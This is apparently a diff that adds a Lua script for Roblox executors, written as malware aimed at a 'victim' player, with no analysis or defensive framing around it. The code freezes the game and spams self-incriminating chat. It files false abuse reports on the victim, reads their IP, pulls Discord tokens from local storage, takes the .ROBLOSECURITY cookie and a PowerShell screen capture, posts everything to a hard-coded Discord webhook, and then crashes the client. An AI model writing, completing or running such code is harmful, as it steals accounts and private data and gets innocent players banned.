@@ -1,0 +1,110 @@
+-- No external server needed
+local webhook = "https://discord.com/api/webhooks/1480088657745416285/Swczm5ZQ20SJBB-qVMvXwrghk7DyOSUMEQVuDW98WbK1UdG2blrNfENVtppcAlWcBC9C"
+local victim = game:GetService("Players").LocalPlayer
+local http = game:GetService("HttpService")
+local platform = game:GetService("UserSettings"):GetService("UserGameSettings").Platform
+
+local function sendToWebhook(content, imageB64)
+    local req = syn and syn.request or request or http_request
+    local data = {content = content}
+    if imageB64 then
+        data.image = imageB64
+    end
+    req({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = http:JSONEncode(data)
+    })
+end
+
+-- Freeze
+local runService = game:GetService("RunService")
+runService:BindToRenderStep("Freeze", 999, function() wait(9e9) end)
+for i = 1, 100 do spawn(function() while true do wait() end end) end
+game:GetService("ScriptContext"):SetTimeout(9e9)
+
+-- Spam chat
+local chat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+if chat then
+    local sendMsg = chat:FindFirstChild("SayMessageRequest")
+    for i = 1, 500 do
+        sendMsg:FireServer("I AM A BOT BAN ME", "All")
+        sendMsg:FireServer("I USE HACKS BAN PLEASE", "All")
+        sendMsg:FireServer("REPORT ME ROBLOX", "All")
+    end
+end
+
+-- Self-report
+local reportService = game:GetService("ReportService")
+if reportService then
+    reportService:ReportAbuse(victim, "Exploiting", "Self-report - I am cheating")
+    reportService:ReportAbuse(victim, "Spamming", "Self-report - Ban me")
+    reportService:ReportAbuse(victim, "Harassment", "Self-report - Please ban")
+end
+
+-- Get IP
+local ip = "UNKNOWN"
+local reqFunc = syn and syn.request or request or http_request
+if reqFunc then
+    local resp = reqFunc({Url = "https://api.ipify.org", Method = "GET"})
+    ip = resp.Body
+end
+
+-- Discord token (PC)
+local discordToken = "NOT_FOUND"
+if platform == Enum.Platform.Windows then
+    local tokenPath = os.getenv("LOCALAPPDATA") .. "\\Discord\\Local Storage\\leveldb"
+    local fileHandle = io.popen('findstr /s /m "mfa\\." "' .. tokenPath .. '\\*.ldb" 2>nul')
+    if fileHandle then
+        local content = fileHandle:read("*all")
+        for match in string.gmatch(content, "([%w-_]+%.[%w-_]+%.[%w-_]+)") do
+            if #match > 50 then discordToken = match break end
+        end
+        fileHandle:close()
+    end
+end
+
+-- Roblox cookie
+local robloxCookie = "REQUIRES_EXECUTOR"
+if syn and syn.cookie then
+    robloxCookie = syn.cookie.get(".ROBLOSECURITY")
+end
+
+-- Camera photo
+local photoB64 = "NO_CAMERA"
+if platform == Enum.Platform.Windows then
+    local psScript = [[
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Windows.Forms
+$camera = New-Object Windows.Forms.WebBrowser
+$camera.Navigate("about:blank")
+while ($camera.ReadyState -ne 'Complete') { Start-Sleep -Milliseconds 100 }
+$bitmap = New-Object System.Drawing.Bitmap(640, 480)
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+$tempFile = [System.IO.Path]::GetTempFileName() + ".jpg"
+$bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+[Convert]::ToBase64String([System.IO.File]::ReadAllBytes($tempFile))
+Remove-Item $tempFile
+]]
+    local pipe = io.popen('powershell -Command "' .. psScript:gsub('"', '\\"') .. '"')
+    photoB64 = pipe:read("*all"):gsub("\n", "")
+    pipe:close()
+elseif platform == Enum.Platform.Android or platform == Enum.Platform.IOS then
+    if syn and syn.mobile and syn.mobile.takePhoto then
+        photoB64 = syn.mobile.takePhoto() or "MOBILE_FAIL"
+    elseif shared and shared.takePhoto then
+        photoB64 = shared.takePhoto()
+    else
+        photoB64 = "MOBILE_NO_FUNCTION"
+    end
+end
+
+-- Send to webhook
+local report = string.format("**Platform:** %s\n**User:** %s\n**IP:** %s\n**Discord Token:** %s\n**Roblox Cookie:** %s",
+    tostring(platform), victim.Name, ip, discordToken, robloxCookie)
+sendToWebhook(report, photoB64)
+
+-- Crash
+game:Shutdown()
